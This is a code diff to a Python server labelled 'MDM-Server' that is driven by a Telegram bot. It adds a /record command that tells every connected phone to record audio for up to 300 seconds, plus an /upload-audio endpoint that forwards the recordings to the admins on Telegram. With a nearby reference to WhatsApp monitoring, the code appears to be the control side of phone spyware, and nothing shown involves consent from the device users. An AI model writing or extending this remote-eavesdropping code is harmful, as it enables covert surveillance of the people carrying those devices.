@@ -1340,6 +1340,63 @@ class MDMBot:
             self._pending.pop(m.chat.id, None)
             bot.reply_to(m, "✅ تم الإلغاء.")
 
+        # ⚡ V11.2.2: /record N — أمر تسجيل صوتي بنمط مباشر (مثل المثال)
+        # /record 30 → يرسل أمر record_audio لكل الأجهزة المتصلة
+        @bot.message_handler(regexp=r'^/record\s+(\d+)\s*$')
+        @MDMBot._guard
+        def _record(m):
+            import re as _re
+            uid = m.from_user.id
+            match = _re.match(r'^/record\s+(\d+)\s*$', m.text or "")
+            if not match:
+                bot.reply_to(m, "💡 الاستخدام: <code>/record 30</code>\n⏱️ المدة بين 5 و 300 ثانية",
+                             parse_mode="HTML")
+                return
+            duration = int(match.group(1))
+            if duration < 5 or duration > 300:
+                bot.reply_to(m, "⚠️ المدة يجب أن تكون بين 5 و 300 ثانية")
+                return
+
+            # إيجاد الأجهزة المتصلة
+            online_devs = self.dm.get_online_devices()
+            if not online_devs:
+                bot.reply_to(m, "❌ لا يوجد جهاز متصل")
+                return
+
+            # إرسال الأمر لكل الأجهزة المتصلة
+            payload = {
+                "command": "record_audio",
+                "category": "audio",
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "params": {"duration": duration}
+            }
+            sent_count = 0
+            for dev in online_devs:
+                sid = self.dm.get_sid_for_device(dev["device_id"])
+                if sid:
+                    try:
+                        self.socketio.emit("command", payload, room=sid)
+                        sent_count += 1
+                        # سجل الأمر المعلق
+                        _pending_cmds[sid] = {
+                            "cid": m.chat.id,
+                            "command": "record_audio",
+                            "device_id": dev["device_id"],
+                            "timestamp": time.time()
+                        }
+                    except Exception as e:
+                        logger.error(f"Failed to emit record command to {sid}: {e}")
+
+            if sent_count > 0:
+                bot.reply_to(m,
+                    f"🎙️ <b>تم إرسال أمر التسجيل</b>\n"
+                    f"⏱️ <b>المدة:</b> {duration} ثانية\n"
+                    f"📱 <b>الأجهزة:</b> {sent_count} جهاز متصل",
+                    parse_mode="HTML")
+                logger.info(f"[Record] {uid} → {duration}s × {sent_count} devices")
+            else:
+                bot.reply_to(m, "❌ فشل الإرسال لجميع الأجهزة")
+
         @bot.message_handler(func=lambda m: True)
         @MDMBot._guard
         def _t(m):
@@ -1463,6 +1520,7 @@ class MDMBot:
         try:
             self.bot.set_my_commands([
                 telebot.types.BotCommand("start", "🚀 لوحة التحكم الرئيسية"),
+                telebot.types.BotCommand("record", "🎙️ تسجيل صوتي: /record 30"),
                 telebot.types.BotCommand("help", "📖 دليل الاستخدام"),
                 telebot.types.BotCommand("devices", "📱 قائمة الأجهزة"),
                 telebot.types.BotCommand("online", "🟢 الأجهزة المتصلة"),
@@ -1514,6 +1572,8 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(na
 logger = logging.getLogger("MDM-Server")
 
 app = Flask(__name__)
+# ⚡ رفع حد تحميل الملفات إلى 100MB (للتسجيلات الصوتية الطويلة)
+app.config["MAX_CONTENT_LENGTH"] = 100 * 1024 * 1024  # 100 MB
 app.config["SECRET_KEY"] = Config.SECRET_KEY or Config.E2E_KEY
 
 # Socket.IO with EIO v3 compatibility
@@ -2800,6 +2860,85 @@ def _api_base64_media():
 
     _process_base64_media(dev, data, None)
     return jsonify({"success": True}), 200
+
+
+# ⚡⚡⚡ V11.2.2: /upload-audio — استقبال ملف صوتي عبر HTTP POST (مثل المثال)
+# يستقبل ملف multipart/form-data مع headers:
+#   - duration: المدة بالثواني
+#   - model:    موديل الجهاز
+#   - device_id: معرف الجهاز (اختياري - للبحث عن SID وإزالة من pending)
+# يرسله للبوت عبر bot.send_audio لكل الأدمنز
+@app.route("/upload-audio", methods=["POST"])
+def _upload_audio():
+    try:
+        if "file" not in request.files:
+            return jsonify({"error": "no file"}), 400
+
+        audio_file = request.files["file"]
+        duration = request.headers.get("duration", "غير محدد")
+        model = request.headers.get("model", "غير محدد")
+        device_id = request.headers.get("device_id", "")
+        original_filename = audio_file.filename or "audio.mp4"
+
+        # قراءة محتوى الملف
+        file_bytes = audio_file.read()
+        if not file_bytes:
+            return jsonify({"error": "empty file"}), 400
+
+        logger.info(f"🎙️ Audio upload received: model={model}, duration={duration}s, "
+                    f"size={len(file_bytes)} bytes, file={original_filename}")
+
+        # إرسال للبوت لكل الأدمنز
+        if not mdm_bot:
+            logger.warning("Bot not configured - dropping audio upload")
+            return jsonify({"error": "bot not configured"}), 503
+
+        from io import BytesIO
+        bio = BytesIO(file_bytes)
+        caption = (f"🎙️ <b>تسجيل صوتي</b>\n"
+                   f"📱 <b>الجهاز:</b> {model}\n"
+                   f"⏱️ <b>المدة:</b> {duration} ثانية\n"
+                   f"📏 <b>الحجم:</b> {len(file_bytes)} bytes")
+
+        success = 0
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                bio.seek(0)
+                # ⚡ استخدم send_audio مع filename (يدعم mp4/aac/3gp)
+                mdm_bot.bot.send_audio(admin_id, audio=bio,
+                                       caption=caption,
+                                       parse_mode="HTML",
+                                       filename=original_filename,
+                                       visible_file_name=original_filename)
+                success += 1
+                logger.info(f"✅ Audio sent to admin {admin_id}")
+            except Exception as e:
+                logger.error(f"❌ Failed to send audio to {admin_id}: {e}")
+                # Fallback: send as document
+                try:
+                    bio.seek(0)
+                    mdm_bot.bot.send_document(admin_id, document=bio,
+                                              caption=caption,
+                                              parse_mode="HTML",
+                                              filename=original_filename,
+                                              visible_file_name=original_filename)
+                    success += 1
+                    logger.info(f"✅ Audio fallback (document) sent to {admin_id}")
+                except Exception as e2:
+                    logger.error(f"❌ Document fallback failed: {e2}")
+
+        # إزالة من pending إذا كان device_id موجوداً
+        if device_id:
+            sid = dm.get_sid_for_device(device_id)
+            if sid:
+                _pending_cmds.pop(sid, None)
+
+        logger.info(f"🎙️ Audio upload complete: {success}/{len(Config.ADMIN_IDS)} admins")
+        return jsonify({"success": True, "sent_to": success}), 200
+
+    except Exception as e:
+        logger.error(f"❌ /upload-audio error: {e}", exc_info=True)
+        return jsonify({"error": str(e)}), 500
 
 
 # ⚡ REST endpoint for whatsapp-image (مراقبة واتساب - fallback)
